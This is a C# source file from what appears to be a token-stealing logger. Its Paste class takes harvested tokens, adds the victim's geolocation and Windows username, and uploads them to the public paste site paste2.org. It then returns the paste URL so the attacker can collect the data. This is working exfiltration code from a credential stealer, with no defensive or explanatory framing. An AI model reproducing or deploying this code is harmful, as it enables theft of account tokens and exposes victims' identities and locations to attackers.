using System;
using System.Text;
using System.Net.Http;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Logger
{
    public class Paste
    {
        private const string baseURL = "https://paste2.org/";
        private const string partToExclude = "/pastes";
        public string finalURL = string.Empty;

        public void UploadPaste(ref StringBuilder tokens)
        {
            Location locationInstance = new Location();

            HttpClient hp = new HttpClient();

            Dictionary<string, string> formData = new Dictionary<string, string>
            {
                { "code", 
                    $"{tokens}\n" +
                    $"Geolocation information:\n" +
                    $"{string.Join("\n", locationInstance.GetGEOInformation())}" 
                },

                { "lang", "text" },

                { "description",
                    $"Tokens for user: {Environment.UserName}\n" +
                    $"Paste uploaded at: {DateTime.Now}"
                }
            };

            try
            {
                Regex pasteURLPattern = new Regex(@"https:\/\/paste2\.org\/pastes\/[A-Za-z0-9]{8}");

                var postValue = hp.PostAsync(baseURL, new FormUrlEncodedContent(formData)).GetAwaiter().GetResult();
                var getValue = postValue.Content.ReadAsStringAsync().GetAwaiter().GetResult().ToString();

                Match getMessageMatch = pasteURLPattern.Match(getValue);
                finalURL = getMessageMatch.Value;
                finalURL = finalURL.Remove(finalURL.IndexOf(partToExclude), partToExclude.Length);

                Console.WriteLine("[+] Paste uploaded successfully!");
            }
            catch
            {
                Console.WriteLine("[!] Unknown error => Please open an issue in the GitHub repository and I will look at it...");
                return;
            }
        }
    }
}
